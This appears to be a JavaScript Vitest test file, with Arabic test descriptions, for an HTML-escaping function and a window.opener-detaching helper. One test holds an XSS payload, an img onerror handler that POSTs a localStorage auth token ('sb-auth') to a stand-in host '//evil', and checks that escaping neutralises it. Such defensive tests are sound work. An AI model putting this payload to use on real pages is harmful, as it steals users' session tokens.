import { describe, it, expect } from 'vitest'
import { escapeHtml, detachOpener } from './htmlEscape'

describe('escapeHtml', () => {
  it('يهرّب وسوم HTML', () => {
    expect(escapeHtml('<script>alert(1)</script>')).toBe(
      '&lt;script&gt;alert(1)&lt;/script&gt;'
    )
  })

  it('يمنع كسر الخصائص عبر علامات الاقتباس', () => {
    expect(escapeHtml('" onmouseover="alert(1)')).toBe(
      '&quot; onmouseover=&quot;alert(1)'
    )
    expect(escapeHtml("' onfocus='alert(1)")).toBe(
      '&#39; onfocus=&#39;alert(1)'
    )
  })

  it('يهرّب العلامة & مرة واحدة فقط (لا ينتج تعبيرًا مزدوجًا)', () => {
    expect(escapeHtml('a & b')).toBe('a &amp; b')
    expect(escapeHtml('&amp;')).toBe('&amp;amp;')
  })

  it('يعيد نصًا فارغًا للقيم الفارغة', () => {
    expect(escapeHtml(null)).toBe('')
    expect(escapeHtml(undefined)).toBe('')
    expect(escapeHtml('')).toBe('')
  })

  it('يحوّل الأرقام إلى نص', () => {
    expect(escapeHtml(1234)).toBe('1234')
    expect(escapeHtml(0)).toBe('0')
  })

  it('يحفظ النص العربي كما هو', () => {
    expect(escapeHtml('أحمد حلمي — 2026')).toBe('أحمد حلمي — 2026')
  })

  it('يحيّد الحمولة المستخدمة فعليًا في إدخال اسم الموكّل', () => {
    const payload = '<img src=x onerror="fetch(\'//evil\',{method:\'POST\',body:localStorage.getItem(\'sb-auth\')})">'
    const escaped = escapeHtml(payload)
    expect(escaped).not.toContain('<img')
    expect(escaped).not.toContain('onerror="')
    expect(escaped).toContain('&lt;img')
  })
})

describe('detachOpener', () => {
  it('يقطع window.opener ويُرجع نفس الكائن', () => {
    const win = { opener: { name: 'portal' } }
    const returned = detachOpener(win)
    expect(returned).toBe(win)
    expect(win.opener).toBe(null)
  })

  it('لا يُسقط التنفيذ عند رفض التعيين (نافذة مقفلة)', () => {
    const win = {}
    Object.defineProperty(win, 'opener', {
      set() {
        throw new Error('blocked')
      },
      get() {
        return 'portal'
      },
    })
    expect(() => detachOpener(win)).not.toThrow()
  })

  it('يتعامل مع القيم الفارغة بأمان', () => {
    expect(() => detachOpener(null)).not.toThrow()
    expect(() => detachOpener(undefined)).not.toThrow()
  })
})
